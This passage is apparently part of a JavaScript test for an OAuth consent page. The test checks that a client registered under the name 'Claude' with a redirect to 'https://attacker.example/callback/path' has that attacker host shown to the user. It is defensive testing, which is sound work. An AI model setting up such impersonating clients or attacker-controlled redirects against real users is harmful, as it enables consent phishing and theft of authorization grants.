  const bad = Object.entries(want).filter(([k, v]) => codes[k] !== v).map(([k, v]) => `${k} ${codes[k]} (want ${v})`);
  expect(!bad.length && page.status === 200 && host[2] === "attacker.example" && host[1] === "https://attacker.example/callback/path" && lede && /read what your role may read and file your work/.test(scopes),
    () => `${bad.join(" | ")} · consent ${page.status} host "${host[2]}" title "${host[1]}" lede ${lede} scopes "${scopes}"`);
  return `registration: ${Object.entries(codes).map(([k, v]) => `${k} ${v}`).join(" · ")}; the consent: "a client calling itself “Claude”", sends you back to ${host[2]} (the whole address on hover), asks to ${scopes}`;
});
